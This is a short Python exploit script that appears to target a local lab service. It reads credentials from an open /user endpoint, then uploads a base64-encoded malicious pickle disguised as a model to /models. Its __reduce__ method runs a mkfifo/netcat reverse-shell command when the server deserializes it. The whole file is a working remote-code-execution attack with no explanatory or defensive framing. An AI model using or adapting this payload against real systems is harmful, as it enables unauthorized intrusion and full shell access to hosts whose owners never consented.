import pickle
import base64
import os
import requests

from requests.auth import HTTPBasicAuth

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1337 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    url = 'http://127.0.0.1:8000'
    ## Fetch credentials
    credsResp = requests.get(f'{url}/user')
    print(f'Creds Response: {credsResp}')
    credsJson = credsResp.json()
    print(f'Creds Json: {credsJson}')
    ## Send malicious model
    basic = HTTPBasicAuth(credsJson['username'], credsJson['password'])
    pickled = pickle.dumps(RCE())
    my_state_vectors = base64.urlsafe_b64encode(pickled)
    resp = requests.post(f'{url}/models', data=my_state_vectors, auth=basic)
    print(resp.content)